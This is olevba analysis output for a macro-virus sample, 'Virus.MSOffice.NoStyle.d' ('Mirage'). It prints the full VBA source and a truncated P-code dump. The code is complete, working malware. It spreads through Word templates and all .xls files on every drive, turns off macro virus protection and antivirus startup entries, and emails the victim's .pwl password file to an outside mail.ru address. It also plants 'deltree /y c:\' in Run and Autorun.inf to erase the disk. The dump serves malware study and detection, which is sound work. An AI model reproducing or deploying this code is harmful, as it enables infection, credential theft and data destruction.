olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.NoStyle.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.NoStyle.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Q4nG2sA6tR0jU6i
Private Sub Document_Open(): On Error Resume Next
mirage:
L = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1)
XXX = Mid(L, 2)
If ActiveDocument.ProtectionType <> wdNoProtection Then ActiveDocument.Unprotect XXX
Application.ScreenUpdating = 0
DOT = False
DOC = False
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "mirage:" Then DOT = True
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "mirage:" Then DOC = True
If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Then GoTo jkm Else GoTo tyda
jkm: rta = GetAttr(NormalTemplate.FullName)
If rta = 33 Then rta = 1
If rta = 1 Then GoTo lxx Else GoTo tyda
lxx: NormalTemplate.OpenAsDocument
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Close
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Windows 95" And DOT = False Then Call PSW_: Call Trojan: End
ActiveDocument.VBProject.VBComponents.Item(1).Export (Environ("WINDIR") & "\SYSTEM\mirage.sys")
Open Environ("WINDIR") & "\SYSTEM\mirage.vbs" For Output As #1
Print #1, "On Error Resume Next"
Print #1, "Set mirage = WScript.CreateObject(""Word.Application"")"
Print #1, "mirage.Options.VirusProtection = 0"
Print #1, "mirage.Options.SaveNormalPrompt = 0"
Print #1, "For x = 1 To mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
Print #1, "mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
Print #1, "Next"
Print #1, "mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile """ & Environ("WINDIR") & "\SYSTEM\mirage.sys"""
Print #1, "mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4"
Print #1, "mirage.NormalTemplate.Save"
Print #1, "mirage.Application.Quit"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "WSHShell.RegDelete ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MIRAGE"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeBackColors"",""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeForeColors"",""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"""
Print #1, "WSHShell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6"","""""
Print #1, "WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel\Options6"","""""
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MIRAGE") = Environ("WINDIR") & "\SYSTEM\mirage.vbs"
GoTo 1
End
tyda:
Document_New
If ActiveDocument.ReadOnly = True Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If DOT = True And DOC = True Then GoTo 1
If DOT = False Then
VV = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString VV
End With
End If
If DOC = False Then
CC = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString CC
End With
End If
If ActiveDocument.FullName = wdOpenFormatDocument Then
ActiveDocument.SaveAs ActiveDocument.FullName
End If
1: ActiveDocument.Saved = True
PSW_
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Document_New
Set BN = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
Set mirage = GetObject(, "Word.Application")
If mirage = "" Then
Set mirage = CreateObject("Word.Application")
Wordz = True
End If
Set GH = mirage.NormalTemplate.VBProject.VBComponents(1).CodeModule
If GH.Lines(3, 1) <> "mirage:" Then
mirage.Options.VirusProtection = 0
mirage.Options.SaveNormalPrompt = 0
GH.DeleteLines 1, GH.CountOfLines
GH.InsertLines 1, BN.Lines(1, BN.CountOfLines)
Set GH = Nothing
End If
If Wordz = True Then mirage.Quit
PSW_
End Sub
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = 0
Document_New
If ActiveDocument.Name = ActiveDocument.FullName Then End
f = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 1)
YYY = Mid(f, 2)
If ActiveDocument.Saved = True Then GoTo 1 Else GoTo 2
1: If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "mirage:" Then ' GoTo 2
NN = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString NN
End With
For P = 1 To 5
L = Int(Rnd() * (90 - 66) + 65): z = Int(Rnd() * (57 - 49) + 48): S = Int(Rnd() * (122 - 98) + 97)
GenPas = GenPas + Chr$(L) + Chr$(z) + Chr$(S)
Next
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.replaceline 1, "'" & GenPas
End If
ActiveDocument.Protect 2, 0, YYY: Application.DisplayAlerts = 0
ActiveDocument.Save
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.replaceline 1, "'" & GenPas: End
2: ActiveDocument.Protect 2, 0, YYY: Application.DisplayAlerts = 0
End Sub
Private Sub PSW_()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "MIRAGE") = "MIRAGE" Then End
Set oa = CreateObject("Outlook.Application")
Set mn = oa.GetNameSpace("MAPI")
Set PSW = oa.CreateItem(0)
If oa = "Outlook" Then
mn.Logon "profile", "password"
PSW.BCC = "btr7@mail.ru"
PSW.Subject = "Fwd: " & Application.UserName
PSW.Body = "Fresh thieved"
PSW.Attachments.Add Environ("WINDIR") & "\" & Application.UserName & ".pwl"
PSW.Send
mn.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "MIRAGE") = "MIRAGE"
End Sub
Private Sub Trojan()
On Error Resume Next
Open Environ("WINDIR") & "\" & "virus.scr" For Output As #1
Print #1, "N VIRUS.BMP"
Print #1, "E 0100 42 4D 76 02 00 00 00 00 00 00 76 00 00 00 28 00"
Print #1, "E 0110 00 00 20 00 00 00 20 00 00 00 01 00 04 00 00 00"
Print #1, "E 0120 00 00 00 02 00 00 C4 0E 00 00 C4 0E 00 00 00 00"
Print #1, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 80"
Print #1, "E 0140 00 00 00 80 80 00 80 00 00 00 80 00 80 00 80 80"
Print #1, "E 0150 00 00 C0 C0 C0 00 80 80 80 00 00 00 FF 00 00 FF"
Print #1, "E 0160 00 00 00 FF FF 00 FF 00 00 00 FF 00 FF 00 FF FF"
Print #1, "E 0170 00 00 FF FF FF 00 99 99 99 99 99 99 99 99 99 99"
Print #1, "E 0180 99 99 99 99 99 99 99 99 00 09 90 09 00 90 09 90"
Print #1, "E 0190 00 99 00 00 09 99 99 99 00 09 90 09 00 90 09 00"
Print #1, "E 01A0 00 09 99 90 09 99 99 90 09 00 90 09 00 00 99 00"
Print #1, "E 01B0 90 09 00 00 09 99 99 90 09 00 90 09 00 90 09 00"
Print #1, "E 01C0 90 09 00 99 99 99 99 90 09 00 90 09 00 00 99 00"
Print #1, "E 01D0 90 09 00 00 09 99 99 99 99 99 99 99 99 99 99 99"
Print #1, "E 01E0 99 99 99 99 99 99 99 99 99 99 90 00 00 00 00 00"
Print #1, "E 01F0 00 99 99 99 99 99 99 99 99 90 00 BB BB BB BB BB"
Print #1, "E 0200 B0 00 99 99 99 99 99 99 99 00 BB BB BB 00 0B BB"
Print #1, "E 0210 BB B0 00 99 99 99 99 99 99 0B BB BB BB BB BB BB"
Print #1, "E 0220 BB BB B0 09 99 99 99 99 00 BB BB BB BB BB BB BB"
Print #1, "E 0230 BB BB BB 00 99 99 99 99 0B BB BB B0 00 00 00 00"
Print #1, "E 0240 BB BB BB B0 99 99 99 99 0B BB B0 00 F0 F0 F0 F0"
Print #1, "E 0250 00 BB BB B0 99 99 99 90 0B 0B 00 00 00 00 00 00"
Print #1, "E 0260 00 0B 0B B0 99 99 99 90 0B B0 B0 00 F0 F0 F0 F0"
Print #1, "E 0270 00 B0 BB B0 99 99 99 90 BB BB 0B B0 00 00 00 00"
Print #1, "E 0280 BB 0B BB B0 99 99 99 90 BB BB BB BB BB BB BB BB"
Print #1, "E 0290 BB BB BB B0 99 99 99 90 BB BB BB BB BB BB BB BB"
Print #1, "E 02A0 BB BB BB 00 99 99 99 99 0B B0 00 00 BB BB BB 00"
Print #1, "E 02B0 00 0B BB 09 99 99 99 99 0B B0 FF F0 0B BB B0 0F"
Print #1, "E 02C0 FF 0B BB 09 99 99 99 99 0B B0 FF FF 00 BB 00 FF"
Print #1, "E 02D0 FF 0B B0 09 99 99 99 99 00 B0 FF F0 0B BB B0 0F"
Print #1, "E 02E0 FF 0B B0 99 99 99 99 99 90 00 00 00 BB BB BB 00"
Print #1, "E 02F0 00 0B B0 99 99 99 99 99 99 0B BB BB BB BB BB BB"
Print #1, "E 0300 BB BB B0 99 99 99 99 99 99 0B BB BB BB BB BB BB"
Print #1, "E 0310 BB BB B0 99 99 99 99 99 99 0B BB BB BB BB BB BB"
Print #1, "E 0320 BB BB B0 99 99 99 99 99 99 00 BB BB BB BB BB BB"
Print #1, "E 0330 BB BB B0 99 99 99 99 99 99 90 00 00 00 0B BB BB"
Print #1, "E 0340 BB BB 09 99 99 99 99 99 99 99 99 99 00 0B BB BB"
Print #1, "E 0350 BB B0 99 99 99 99 99 99 99 99 99 99 99 00 00 00"
Print #1, "E 0360 00 09 99 99 99 99 99 99 99 99 99 99 99 99 99 99"
Print #1, "E 0370 99 99 99 99 99 99"
Print #1, "RCX"
Print #1, "276"
Print #1, "W"
Print #1, "Q"
Close #1
ChDir Environ("WINDIR") & "\"
Open Environ("WINDIR") & "\" & "virus.bat" For Output As #1
Print #1, "@echo off"
Print #1, "debug < virus.scr"
Close #1
Shell Environ("WINDIR") & "\" & "virus.bat", 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper") = Environ("WINDIR") & "\" & "virus.bmp"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "WallpaperStyle") = "2"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "Virus MIRAGE !!!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Adieus!!!"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "MIGAGE") = "deltree /y c:\"
System.PrivateProfileString("C:\Autorun.inf", "Autorun", "Open") = "Deltree /Y C:\"
SetAttr "C:\Autorun.inf", 2 + 4
Dim a, b, c
a = 5
b = Timer
Do While Timer < b + a
DoEvents
Loop
c = Timer
Kill Environ("WINDIR") & "\" & "virus.scr"
Kill Environ("WINDIR") & "\" & "virus.bat"
Tasks.ExitWindows
End Sub
Private Sub Document_New()
On Error Resume Next
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Application.DisplayAlerts = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0
ActiveDocument.ReadOnlyRecommended = 0
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then: CommandBars("Macro").Controls("Security...").Enabled = 0: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AVPCC") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", "AVPCC Service") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
If Day(Now()) = 12 And WeekDay(Now()) = 5 Then: Call Trojan: End
On Error GoTo qw
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "mirage:" Then
If NormalTemplate.VBProject.VBComponents("mirage").Name = "mirage" Then Exit Sub
qw: rn = Int(Rnd() * 95891 + 1)
Open Environ("WINDIR") & "\SYSTEM\" & rn & ".sys" For Output As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "mirage" & Chr(34)
Print #1, "Sub ViewVBcode()"
Print #1, "End Sub"
Print #1, "Sub AutoExec()"
Print #1, "Options.VirusProtection = 0"
Print #1, "V = Second(Now())"
Print #1, "Application.OnTime Now + TimeValue(""00:"" & (V) & "":00""), ""InfXls"""
Print #1, "End Sub"
Print #1, "Sub ToolsOptions()"
Print #1, "Options.VirusProtection = 1"
Print #1, "If Dialogs(wdDialogToolsOptions).Show Then"
Print #1, "End If"
Print #1, "Options.VirusProtection = 0"
Print #1, "End Sub"
Print #1, "Sub ToolsMacro()"
Print #1, "End Sub"
Print #1, "Sub Organizer()"
Print #1, "End Sub"
Print #1, "Sub AutoExit()"
Print #1, "Application.ScreenUpdating = 0"
Print #1, "Options.VirusProtection = 1"
Print #1, "End Sub"
Print #1, "Sub InfXls()"
Print #1, "On Error Resume Next"
Print #1, "Set fs = Application.FileSearch"
Print #1, "fs.LookIn = ""C:\ ; D:\ ; E:\ ; F:\ ; G:\ ; H:\ ; I:\ ; J:\ ; K:\ ; L:\ ; M:\ ; N:\ ; O:\ ; P:\ ; Q:\ ; R:\ ; S:\ ; T:\ ; U:\ ; V:\ ; W:\ ; X:\ ; Y:\ ; Z:\"
Print #1, "fs.SearchSubFolders = True"
Print #1, "fs.FileName = ""*.xls"""
Print #1, "fs.Execute"
Print #1, "For z = 1 To fs.FoundFiles.Count"
Print #1, "SetAttr fs.FoundFiles(z), 0"
Print #1, "DD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)"
Print #1, "Set XLS = CreateObject(""Excel.Application"")"
Print #1, "Set qwert = XLS.Workbooks.Open(fs.FoundFiles(z))"
Print #1, "If qwert.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> ""mirage:"" Then"
Print #1, "With qwert.VBProject.VBComponents.Item(1).CodeModule"
Print #1, ".DeleteLines 1, .CountOfLines: .AddFromString DD"
Print #1, "End With"
Print #1, "qwert.Save"
Print #1, "End If"
Print #1, "qwert.Close"
Print #1, "Next z"
Print #1, "XLS.Quit"
Print #1, "End Sub"
Print #1, "Sub FilePrint()"
Print #1, "On Error Resume Next"
Print #1, "If Dialogs(wdDialogFilePrint).Show = -1 Then"
Print #1, "Call InfXls"
Print #1, "End If"
Print #1, "End Sub"
Close #1
NormalTemplate.VBProject.VBComponents.import (Environ("WINDIR") & "\SYSTEM\" & rn & ".sys")
Kill Environ("WINDIR") & "\SYSTEM\" & rn & ".sys"
NormalTemplate.Save
End If
End Sub
'
'               MMM            MMMMMMMMM                 MM
'             MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
'              MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
'               MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
'               MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'               MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
'               MMM        MMMMMMMMMMMMM           MMMMMMMMMM
'               MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM
'                MM         MMMMMMMM               M  MMMMMMM
'                MM        MMMMMMMMM             MMM   MMMMMM
'                         MMMMMMMMMMMMMM      MMMMM    MMMMMM
'                MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
'               MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
'              MMMMMMMMMM                                MM
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.NoStyle.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 25201 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000F "Q4nG2sA6tR0jU6i"
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #2:
' 	Label mirage 
' Line #3:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St L 
' Line #4:
' 	Ld L 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St XXX 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd ProtectionType 
' 	Ld wdNoProtection 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld XXX 
' 	Ld ActiveDocument 
' 	ArgsMemCall Unprotect 0x0001 
' 	EndIf 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #7:
' 	LitVarSpecial (False)
' 	St DOT 
' Line #8:
' 	LitVarSpecial (False)
' 	St DOC 
' Line #9:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "mirage:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DOT 
' 	EndIf 
' Line #10:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "mirage:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DOC 
' 	EndIf 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ld vbReadOnly 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo jkm 
' 	Else 
' 	BoSImplicit 
' 	GoTo tyda 
' 	EndIf 
' Line #12:
' 	Label jkm 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St rta 
' Line #13:
' 	Ld rta 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St rta 
' 	EndIf 
' Line #14:
' 	Ld rta 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lxx 
' 	Else 
' 	BoSImplicit 
' 	GoTo tyda 
' 	EndIf 
' Line #15:
' 	Label lxx 
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #16:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #17:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #18:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0007 "Version"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000A "Windows 95"
' 	Eq 
' 	Ld DOT 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) PSW_ 0x0000 
' 	BoS 0x0000 
' 	ArgsCall (Call) Trojan 0x0000 
' 	BoS 0x0000 
' 	End 
' 	EndIf 
' Line #19:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0012 "\SYSTEM\mirage.sys"
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #20:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0012 "\SYSTEM\mirage.vbs"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "Set mirage = WScript.CreateObject("Word.Application")"
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "mirage.Options.VirusProtection = 0"
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "mirage.Options.SaveNormalPrompt = 0"
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0059 "For x = 1 To mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004D "mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1"
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Next"
' 	PrintItemNL 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004D "mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ""
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	Concat 
' 	LitStr 0x0013 "\SYSTEM\mirage.sys""
' 	Concat 
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0050 "mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4"
' 	PrintItemNL 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "mirage.NormalTemplate.Save"
' 	PrintItemNL 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "mirage.Application.Quit"
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Set WSHShell = WScript.CreateObject("WScript.Shell")"
' 	PrintItemNL 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005C "WSHShell.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MIRAGE""
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0074 "WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeBackColors","1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1""
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0076 "WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeForeColors","1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1""
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0065 "WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6","""
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0078 "WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel\Options6","""
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #39:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0012 "\SYSTEM\mirage.vbs"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0006 "MIRAGE"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #40:
' 	GoTo 1 
' Line #41:
' 	End 
' Line #42:
' 	Label tyda 
' Line #43:
' 	ArgsCall Document_New 0x0000 
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #45:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #46:
' 	Ld ActiveDocument 
' 	ArgsMemCall Reload 0x0000 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld DOT 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DOC 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #49:
' 	Ld DOT 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #50:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VV 
' Line #51:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #52:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld VV 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #53:
' 	EndWith 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld DOC 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St CC 
' Line #57:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #58:
' 	LitDI2 0x0001 
